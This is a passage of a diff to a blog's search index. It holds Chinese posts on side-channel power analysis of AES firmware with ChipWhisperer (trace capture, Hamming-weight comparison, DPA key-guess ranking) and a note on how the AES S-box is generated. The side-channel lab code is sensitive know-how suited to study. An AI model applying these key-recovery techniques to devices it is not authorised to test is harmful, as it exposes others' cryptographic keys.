class="comment">#Keep most likely</span></span><br><span class="line">    key_guess.append(sorted_args[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Print results</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Subkey %2d - most likely %02X (actual %02X)&quot;</span>%(subkey, key_guess[subkey], known_key[subkey]))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Print other top guesses</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Top 5 guesses: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        g = sorted_args[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;   %02X - Diff = %f&quot;</span>%(g, max_diffs[g]))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527041851759.png" alt="image-20230527041851759" style="zoom:50%;">
-
-<p>画出猜测错误key的前几个可能值和真实key的差异图</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0x2B</span>]) * cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0x40</span>]) * cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0xBF</span>])</span><br></pre></td></tr></table></figure>
-
-<p>正确key的峰形会在某些地方拥有比错误key的峰形高。</p>
-<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527043707408.png" alt="image-20230527043707408" style="zoom:50%;">
-
-<p>有关幽灵峰的问题之后再细补充</p>
-<p>Reference</p>
-<p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
+<p>要求的就是b(x)</p>
+<p>a(x) * b(x) = 1 mod m(x)</p>
+<p>如何求多项式的乘法逆元呢？这里用到了扩展欧几里得定理</p>
+<p>a(x) * b(x) + s(x) * m(x) = 1</p>
+<p>这里拿02举例子，02对应的多项式为x，m(x)移到右边可以和右边的1消掉（这里的+是表示异或操作）</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051157794.png" alt="image-20230618051157794"></p>
+<p>所以要求的b(x)就是</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051243218.png" alt="image-20230618051243218"></p>
+<p>S-box还可以用xtime的方法更高效求逆元，具体可以参考b站这个小姐姐讲的<a href="https://www.bilibili.com/video/BV14i4y197iE/?spm_id_from=333.337.search-card.all.click">现代密码学｜AES数学基础｜GF（2^8）有限域上的运算问题</a></p>
+<h2 id="仿射变化"><a href="#仿射变化" class="headerlink" title="仿射变化"></a>仿射变化</h2><p>求出了02的逆元10001101后，利用下面的矩阵运算做仿射，bi就是10001101的各个比特位的值</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051743126.png" alt="image-20230618051743126"></p>
+<p>其实就是下面的公式（需要注意的是用到了LSB，表示低位在前，所以63的二进制是从下往上依次为01100011）</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051913540.png" alt="image-20230618051913540"></p>
+<p>经过这轮变化后，计算出来02对应S-box中的值为7B，对照S-box表也是这个数，验证成功</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618053334153.png" alt="image-20230618053334153"></p>
+<p>关于代码实现还有仿射变化的深入理解，之后有空再总结，涉及的数学原理就太深了，光目前为止，就感受到了这些数学方法带来的扩展性和目的</p>
+<p>By the way, “If you’re typing the letters A-E-S into your code, you’re doing it wrong.” - Thomas Pacek</p>
 ]]></content>
       <tags>
-        <tag>SCA</tag>
         <tag>AES</tag>
-        <tag>DPA</tag>
+        <tag>Cryptograph</tag>
+        <tag>Algorithm</tag>
       </tags>
   </entry>
   <entry>
@@ -2425,48 +2505,6 @@
       </tags>
   </entry>
   <entry>
-    <title>理解AES_S-box盒生成</title>
-    <url>/2023/06/18/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/</url>
-    <content><![CDATA[<p>一开始，我以为S-box这玩意就是随便找的一个map去做substitution，但仔细研究发现原来这里面数学原理深奥去了。光S-box的生成就很有意思，核心就是求多项式的逆元和访射变化，之后有大量时间再做更深层次的分析，本次对AES中的S-box的生成做一个笔记，学习AES是为了了解它的数学设计思想，为之后理解<strong>Number theoretic transform</strong>热身。</p>
-<h2 id="求乘法逆元"><a href="#求乘法逆元" class="headerlink" title="求乘法逆元"></a>求乘法逆元</h2><p>首先，对于S-box是行从00~ff，列也是从00～ff的一个matrix，也就是有限域GF(2^8)的所有element（0～255）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F </span><br><span class="line">10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F</span><br><span class="line">20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F</span><br><span class="line">40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F </span><br><span class="line">50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F</span><br><span class="line">60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F </span><br><span class="line">70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F</span><br><span class="line">80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F </span><br><span class="line">90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F</span><br><span class="line">A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF </span><br><span class="line">B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF</span><br><span class="line">C0 C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF </span><br><span class="line">D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF</span><br><span class="line">E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF </span><br><span class="line">F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF</span><br></pre></td></tr></table></figure>
-
-<p>把每个字节看成一个多项式用来表达它的二进制形式，ai代表第i比特位的值（0或者1）</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618042704999.png" alt="image-20230618042704999"></p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618043439441.png" alt="image-20230618043439441"></p>
-<p>将矩阵里的所有elements都求它的乘法逆元</p>
-<p>00的逆元就是00本身</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618043730475.png" alt="image-20230618043730475"></p>
-<p>最重要的是如何计算多项式的乘法逆元，a(x)就是此时的字节，m(x)是一个固定的不可约多项式（因式只有1和它本身）</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618044228637.png" alt="image-20230618044228637"></p>
-<p>这里提一句，这个S-box的设计真的给AES带来了很强的扩展性，光m(x)其实就可以扩展使用其他的数来代替，比如下面这些，RJNDAEL选择了0x11b，也就是上述的m(x)多项式，关于这块想更了解的可以看这篇论文<a href="https://www.sciencedirect.com/science/article/pii/S2212017313006051">Generation of AES S-Boxes with various modulus and additive constant polynomials and testing their randomization</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11B, 11D, 12B, 12D, 139, 13F, 14D, 15F, 163, 165, 169, 171, 177, 17B, 187, 18B, 18D, 19F, 1A3, 1A9, 1B1, 1BD, 1C3, 1CF, 1D7, 1DD, 1E7, 1F3, 1F5, 1F9.</span><br></pre></td></tr></table></figure>
-
-<p>要求的就是b(x)</p>
-<p>a(x) * b(x) = 1 mod m(x)</p>
-<p>如何求多项式的乘法逆元呢？这里用到了扩展欧几里得定理</p>
-<p>a(x) * b(x) + s(x) * m(x) = 1</p>
-<p>这里拿02举例子，02对应的多项式为x，m(x)移到右边可以和右边的1消掉（这里的+是表示异或操作）</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051157794.png" alt="image-20230618051157794"></p>
-<p>所以要求的b(x)就是</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051243218.png" alt="image-20230618051243218"></p>
-<p>S-box还可以用xtime的方法更高效求逆元，具体可以参考b站这个小姐姐讲的<a href="https://www.bilibili.com/video/BV14i4y197iE/?spm_id_from=333.337.search-card.all.click">现代密码学｜AES数学基础｜GF（2^8）有限域上的运算问题</a></p>
-<h2 id="仿射变化"><a href="#仿射变化" class="headerlink" title="仿射变化"></a>仿射变化</h2><p>求出了02的逆元10001101后，利用下面的矩阵运算做仿射，bi就是10001101的各个比特位的值</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051743126.png" alt="image-20230618051743126"></p>
-<p>其实就是下面的公式（需要注意的是用到了LSB，表示低位在前，所以63的二进制是从下往上依次为01100011）</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051913540.png" alt="image-20230618051913540"></p>
-<p>经过这轮变化后，计算出来02对应S-box中的值为7B，对照S-box表也是这个数，验证成功</p>
-<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618053334153.png" alt="image-20230618053334153"></p>
-<p>关于代码实现还有仿射变化的深入理解，之后有空再总结，涉及的数学原理就太深了，光目前为止，就感受到了这些数学方法带来的扩展性和目的</p>
-<p>By the way, “If you’re typing the letters A-E-S into your code, you’re doing it wrong.” - Thomas Pacek</p>
-]]></content>
-      <tags>
-        <tag>AES</tag>
-        <tag>Cryptograph</tag>
-        <tag>Algorithm</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>长安战疫网络安全卫士守护赛wp</title>
     <url>/2022/01/10/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/</url>
     <content><![CDATA[<p><strong>其他题目整合到我的CTF仓库中了</strong></p>
@@ -2589,44 +2627,6 @@
         <tag>CTF</tag>
         <tag>wp</tag>
         <tag>比赛</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>测信道攻击——Hamming Weight Swings</title>
-    <url>/2023/05/24/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94Hamming-Weight-Swings/</url>
-    <content><![CDATA[<p>实验：以Hamming Weight为标准，对不同数据进行AES加密能耗的差别</p>
-<p>Hamming Weight：二进制数中包含’1’的个数</p>
-<p>我们作出一个假设：data line上的比特位会消耗可测量的功耗。</p>
-<p>对0x00（包含0个1）和0xff（包含8个1）这两个权重很极端的数据进行测试，设置trace的量为100，当设备运行AES算法时，对这两个文本加密，如果假设正确，那么在高权重和低权重的功耗曲线上能观察到可测量的差异。目前，这些功耗曲线都混在一起了。将它们分成两组：one_list和zero_list。检查第一个字节来检查是否为0x00，并假设如果不是0x00就是0xFF。以下是一个简单的迭代循环来打印它们：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ktp = cw.ktp.Basic()</span><br><span class="line">trace_array = []</span><br><span class="line">textin_array = []</span><br><span class="line"></span><br><span class="line">key, text = ktp.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">target.set_key(key)</span><br><span class="line"></span><br><span class="line">N = <span class="number">100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tnrange(N, desc=<span class="string">&#x27;Capturing traces&#x27;</span>):</span><br><span class="line">    scope.arm()</span><br><span class="line">    <span class="keyword">if</span> text[<span class="number">0</span>] &amp; <span class="number">0x01</span>:</span><br><span class="line">        text[<span class="number">0</span>] = <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text[<span class="number">0</span>] = <span class="number">0x00</span></span><br><span class="line">    target.simpleserial_write(<span class="string">&#x27;p&#x27;</span>, text)</span><br><span class="line">    </span><br><span class="line">    ret = scope.capture()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target timed out!&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    response = target.simpleserial_read(<span class="string">&#x27;r&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    trace_array.append(scope.get_last_trace())</span><br><span class="line">    textin_array.append(text)</span><br><span class="line">    </span><br><span class="line">    key, text = ktp.<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure>
-
-<p>将数据分为两组，并将结果转为numpy array类型</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">zero_list=[]</span><br><span class="line">one_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trace_array)):</span><br><span class="line">    <span class="keyword">if</span> textin_array[i][<span class="number">0</span>] == <span class="number">0x00</span>:</span><br><span class="line">        zero_list.append(trace_array[i])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_list.append(trace_array[i])</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_list=np.array(one_list)</span><br><span class="line">zero_list=np.array(zero_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(one_list) &gt; <span class="built_in">len</span>(zero_list)/<span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(zero_list) &gt; <span class="built_in">len</span>(one_list)/<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>对两组数据用np.mean求均值，得到zero_avg和one_avg</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trace_length = <span class="built_in">len</span>(one_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Traces had original sample length of %d&quot;</span>%trace_length)</span><br><span class="line"></span><br><span class="line">one_avg=np.mean(one_list, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(one_avg) != trace_length:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Average length is only %d - check you did correct dimensions!&quot;</span>%one_avg)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trace_length = <span class="built_in">len</span>(zero_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Traces had original sample length of %d&quot;</span>%trace_length)</span><br><span class="line"></span><br><span class="line">zero_avg=np.mean(zero_list, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(zero_avg) != trace_length:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Average length is only %d - check you did correct dimensions!&quot;</span>%zero_avg)</span><br></pre></td></tr></table></figure>
-
-<p>用图形表示两组的差异</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">diff = one_avg[:<span class="number">1000</span>] - zero_avg[:<span class="number">1000</span>]</span><br><span class="line"></span><br><span class="line">plt.plot(<span class="built_in">abs</span>(diff))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-
-<p>在100的位置可以看到一个明显的峰值，其余部分的差异都非常小</p>
-<img src="https://re1own.github.io/assets/img/测信道攻击——Hamming-Weight-Swings/image-20230525003148705.png" alt="image-20230525003148705" style="zoom:50%;">
-
-<p>把trace换成1000，发现还是在100的时候变化最大，那么那个点可能就是在aes加密的节点</p>
-<img src="https://re1own.github.io/assets/img/测信道攻击——Hamming-Weight-Swings/image-20230525004414856.png" alt="image-20230525004414856" style="zoom:50%;">
-
-
-
-<p>Reference</p>
-<p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
-]]></content>
-      <tags>
-        <tag>SCA</tag>
-        <tag>Power Analysis Attack</tag>
       </tags>
   </entry>
 </search>
